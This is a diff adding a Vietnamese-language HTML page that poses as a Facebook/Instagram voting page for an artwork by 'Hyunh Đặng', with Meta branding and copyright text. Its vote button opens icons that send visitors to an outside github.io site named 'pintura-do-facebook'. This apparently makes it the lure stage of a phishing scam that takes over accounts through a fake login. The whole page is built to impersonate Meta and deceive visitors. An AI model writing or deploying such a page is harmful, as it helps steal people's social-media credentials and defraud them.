@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="bỏ phiếu với Facebook">
+    <meta property="og:description" content="Bình chọn cho Hyunh Đặng bằng Facebook">
+    <meta property="og:image" content="https://raw.githubusercontent.com/ASPCA/cook/2bebaf6db119433478d46eece0f1c9f8a9ad6a18/8a283fcb2d8d42821b909209e5cebaff.jpg">
+    <meta property="og:type" content="website">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 600px;
+            margin: 50px auto; /* Editable margin top and bottom */
+            padding: 10px;
+            border: 0px solid #ccc;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .logo {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .editable-text {
+            font-size: 18px; /* Editable font size */
+            font-weight: normal; /* Editable font weight */
+            margin: 20px 0; /* Editable margin top and bottom */
+        }
+
+        .editable-image {
+            max-width: 100%;
+            height: auto;
+            margin: 20px 0; /* Editable margin top and bottom */
+        }
+        /* Add this style to your existing CSS */
+
+button {
+    background-color: #0e59ee;
+    color: #fff;
+    padding: 10px 20px;
+    font-size: 16px;
+    max-width: 80%;
+    border: none;
+    cursor: pointer;
+    border-radius: 20px;
+    transition: background-color 0.3s;
+}
+
+button:hover {
+    background-color: #0e59ee;
+}
+
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .popup-content {
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .popup-text {
+            font-size: 16px; /* Editable font size */
+            margin-bottom: 20px;
+        }
+
+        .popup-icons {
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .popup-icon {
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+        }
+        .footer {
+            background-color: #fff; /* Editable background color */
+            color: rgb(189, 189, 189);
+            text-align: center;
+            padding: 20px;
+            margin-top: 90px; /* Editable margin top */
+            margin-bottom: 20px; /* Editable margin bottom */
+        }
+
+        .footer a {
+            color: rgb(189, 189, 189);; /* Editable link color */
+            text-decoration: none;
+            margin: 0 10px; /* Editable space between links */
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://raw.githubusercontent.com/FacebookArt/pak2/932c5b01030012c9e00871db959cdf045c5e0306/ayesha.png" alt="" class="logo">
+    <div class="editable-text">
+        <p>Bình chọn cho tác phẩm này của Hyunh Đặng</p>
+    </div>
+    <img src="https://raw.githubusercontent.com/ASPCA/cook/2bebaf6db119433478d46eece0f1c9f8a9ad6a18/8a283fcb2d8d42821b909209e5cebaff.jpg" alt="" class="editable-image">
+    <button onclick="openPopup()">Tiến hành bỏ phiếu</button>
+</div>
+
+<div id="popup" class="popup">
+    <div class="popup-content">
+        <p class="popup-text">tiến hành bỏ phiếu với:</p>
+        <div class="popup-icons">
+            <img src="https://raw.githubusercontent.com/babayaga56/logo7/604e61817bb49c82fa547de8c17e5b85ca9c5c20/logo.png" alt="" class="popup-icon" onclick="openUrl('https://pintura-do-facebook.github.io/Andriana-da-silva/')">
+            <img src="https://raw.githubusercontent.com/babayaga56/icon2/c141cafde226564a6c583859bbc7ada2e1baa05f/logo2.png" alt="" class="popup-icon" onclick="openUrl('https://pintura-do-facebook.github.io/Andriana-da-silva/')">
+        </div>
+    </div>
+</div>
+
+<script>
+    function openPopup() {
+        document.getElementById('popup').style.display = 'flex';
+    }
+
+    function closePopup() {
+        document.getElementById('popup').style.display = 'none';
+    }
+
+    function openUrl(url) {
+        window.open(url, '_blank');
+    }
+</script>
+<div class="footer">
+    <a>Meta</a>
+    <a>Về</a>
+    <a>Blog</a>
+    <a>Việc làm</a>
+    <a>Giúp đỡ</a>
+    <a>API</a>
+    <a>Sự riêng tư</a>
+    <a>điều kiện</a>
+    <a>Instagram Lite</a>
+    <a>Threads</a>
+    <a>Meta Verified</a>
+    <a>Tiếng Việt</a>
+    <br>
+    © 2024 Instagram from Meta
+
+</body>
+</html>
